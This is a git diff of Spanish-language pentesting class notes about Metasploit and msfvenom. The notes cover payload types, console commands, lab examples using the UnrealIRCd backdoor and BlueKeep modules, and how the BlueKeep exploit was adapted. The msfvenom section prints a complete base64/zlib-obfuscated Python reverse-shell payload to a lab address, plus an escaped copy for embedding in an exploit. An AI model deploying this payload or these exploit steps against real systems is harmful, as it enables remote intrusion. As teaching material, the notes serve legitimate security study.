@@ -535,21 +535,21 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  Tambien tiene herramientas auxiliares que nos permiten realzar toda la fase de lanzamiento del exploit manejo de la conexion, herramientas de pos explotacion, es un entorno completo que nos facilita la creacion de exploits
  el uso de diferentes payloads, recibir la conexion manejarla etc... metasploit se fundamenta en el concepto modulo cada uno de los exploits se corresponden con un modulo, la unidad basica de metasploit son los modulos tambien
  tiene plugings, tenemos scripts, bases de datos, librerias. tambien nos permite juntar payloads con exploits, Metasploit usa el lenguaje de programacion ruby
-## Informacionimportante Metasploit
+### Informacion importante Metasploit
  - Funcionamiento -> al buscar un exploit en especifico podremos observar si dicho exploit tiene una funcionalidad buena, excelente, mala, o manual, es importante que al momento de usarlo tener muy precente esta inforamcion ya que si el exploit tiene un uso excelente
  no va haber amyor problema al ejecutarlo, pero si por lo contrario tiene en este caso manual como lo es en el exploit *windows/rdp/cve_2019_0708_bluekeep_rce* tendremos que modificar el exploit para que funcione de manera correcta
  - Opciones -> tenemos que tener muy en cuenta las opciones o los requerimientos que nos pide el exploit para poderse ejecutar estos los podremos por con el comando *Show options* alli podremos ver todas las opciones del programa y modificar ya sea el rhos, lhost, lport, rport
  etc... Todas las opciones reuqeridas para el funcionamiento del exploit tendran un yes, asi sabremos cuales tenemos que modificar o agregar de manera obligatoria para su correcto funcionamiento
  - Modificacion de los exploits -> Para la modificacion de exploit *exploit/windows/cve_2019_0708_bluekeep_rce* que al lanzarlo contra el objetivo metasploitable windows, crasheaba el sistema operativo por que trataba de obtener una parte de la memoria inaxecible
- tuvimos que acceder al exploit y modificarlo con emacs, tendremos que modificar el groombase de el area de trabajo mas parecido al de nuestro objetivo, para poder conocer la direccion de la memoria que no esta realizando paginacion, usamos distintas pruebas pero al final lologramos de manera manual
- usamos el programa vmss2core desde nuestro equipo host, tambien necesitamos un debuger en este caso para windosw windbg, usaremos los ficheros propios de vmware, los cuales modificaremos desde el cmd de windows, para realizar un volcado de la memoria para asi realizar un analissi y encontrar la parte de la memoria
- que no esta conpaginando, con la direccion que obtengamos, usaremos emacs de nuevo desde nuestro kali linux para modificar la parte de la memoria que no estaba conpaginando, poner la parte de la memoria que si esta conpaginando
- - Payloads -> No todos los exploits dependen de un payload para su funcionamiento hay diversos tipos de exploit que podremos aprovechar sin el uso de payloads como **  y otros que dependen de uno para su funcionamiento como *use exploit/windows/cve_2019_0708_bluekeep_rce*
-### Payloads 
+ tuvimos que acceder al exploit y modificarlo con *emacs*, tendremos que modificar el groombase de el area de trabajo mas parecido al de nuestro objetivo, para poder conocer la direccion de la memoria que no esta realizando paginacion, usamos distintas pruebas pero al final lo haremos de manera manual
+ usamos el programa vmss2core desde nuestro equipo host, tambien necesitamos un debuger en este caso para windosw windbg, usaremos los ficheros propios de vmware, los cuales modificaremos desde el cmd de windows, para realizar un volcado de la memoria para asi realizar un analisis y encontrar la parte de la memoria
+ que si esta conpaginando, con la direccion que obtengamos, usaremos emacs de nuevo desde nuestro kali linux para modificar la parte de la memoria que no estaba conpaginando, poner la parte de la memoria que si esta conpaginando
+ - Payloads -> No todos los exploits dependen de un payload para su funcionamiento hay diversos tipos de exploit que podremos aprovechar sin el uso de payloads como *use exploit/windows/cve_2019_0708_bluekeep_rce*  y otros que dependen de uno para su funcionamiento como **
+#### Payloads 
  - singles -> payloads autocontenidos y autosuficientes no nececitan de metasploit para funcionar, ejemplo si tenemos un payload que nos devuelve una conexion podremos recibirla con la herramienta que queramos; recibir una conexion inversa, añadir un usuario 
  - stagers -> son payloads pequeños para tareas especificas que nos permiten establecer una conexion con una maquina y nos devuelven una conexion reversa y descarga o aprovecha algun payload de tipo stages para realizar alguna accion (Depende mucho mas de metasploit)
  - stages -> son payloads realizan acciones mucho mas avanzadas inyectar; una dll en un proceso, devolverr una shell encriptada(Depende mucho mas de metasploit)
-### Comandos metasploit
+#### Comandos metasploit
  - search -> nos permite buscar un exploit para alguna vulnerabilidad que hayamos encontrado tambien nos permite buscar auxiliares, payloads
  - use -> nos permite usar uno de los exploits que tenga metasploit
  - back -> retrocede o cancela una accion
@@ -560,7 +560,7 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  - show payloads -> Nos permite observar todos los payloads compatibles con el exploit
  - sessions -> Nos muetsra las sesiones que tenemos activas
  - msfconsole -> Con este comando accedemos a la consola de metasploit
-### Ejemplos Metasploit
+#### Ejemplos Metasploit
  - set rhost 192.168.157.128
  - set lhost 192.168.157.130
  - use unix/irc/unreal_ircd_3281_backdoor
@@ -569,5 +569,17 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  - set payload cmd/unix/reverse
  - exploit
  - use exploit/windows/cve_2019_0708_bluekeep_rce
-### Comandos importantes dentro de la maquina 
+#### Comandos importantes dentro de la maquina 
  - /etc/passwd -> Nos muestra los usuarios e informacion importante
+# Clase practica dia 24 15/10/2024
+## Msfvenom
+ - es un generador de payloads ya no tendremos que usar la consola de metasploit, podremos usar msfvenom para asi generar un unico payload, y poder usarlo nosotros con un exploit traido de internet o que nos otros hayamos creado
+#### Comandos msfvenom 
+ - -p -> nos permite generar los payloads
+### Informacion importante Msfvenom
+ - Generacion de payloads -> Para generar un payload tendremos que saber cual va a ser el payload que necesitamos generar, dependiendo la vulnerabilidad y lo que necesitemos. en esta clase generamos un payload que nos genera una conexion reversa atraves de una shell
+  en cuestion -> *python/shell_reverse_tcp lhost=192.168.157.130 lport=4444* como observamos esta shell esta en python y nos va a generar una conexion reversa al puerto y a la ip que hayamos colocado alli, 
+  el payload que nos genero fue este -> exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNjk1PAyEQhs/wK7gtxJUstWo14dCYNWmM2rR7b7YwTUlX2DCs/n3B7sG5PfM+8+G+xhATw2AukFiPDKmbW9NxjMEAYmlHikGjvHoc5fr1sPlouxrl/vPl7bDvdu36XWRJmuA9mMR5pZ4WUj2spLp/lOquqeplLiHoz9kNwLo4wTMlVueZCOabq2axFJS4ExvAcyu0bnJOjhH6CyWjjnIbxpJICyZY4NWUTrerStR4hmHQZWGNyTpf1M22LRCm9I8gxpnyoaBHeTXy/d5ycfPH2ZmZkvwagrc8CPoLYsZcsg==')[0])))
+  al generar un payload y introducirlo dentro de un exploit tendremos que modificarlo para que coincida con el funcionamiento del exploit en este caso tendremos que colocar *\* antes de cada *'* el payload luego de su modificacion quedo asi para su 
+  correcto funcionamiento ->python_payload =f'python -c \"exec(__import__(\'zlib\').decompress(__import__(\'base64\').b64decode(__import__(\'codecs\').getencoder(\'utf-8\')(\'eNpNjk1PAyEQhs/wK7gtxJUstWo14dCYNWmM2rR7b7YwTUlX2DCs/n3B7sG5PfM+8+G+xhATw2AukFiPDKmbW9NxjMEAYmlHikGjvHoc5fr1sPlouxrl/vPl7bDvdu36XWRJmuA9mMR5pZ4WUj2spLp/lOquqeplLiHoz9kNwLo4wTMlVueZCOabq2axFJS4ExvAcyu0bnJOjhH6CyWjjnIbxpJICyZY4NWUTrerStR4hmHQZWGNyTpf1M22LRCm9I8gxpnyoaBHeTXy/d5ycfPH2ZmZkvwagrc8CPoLYsZcsg==\')[0])))"'
+
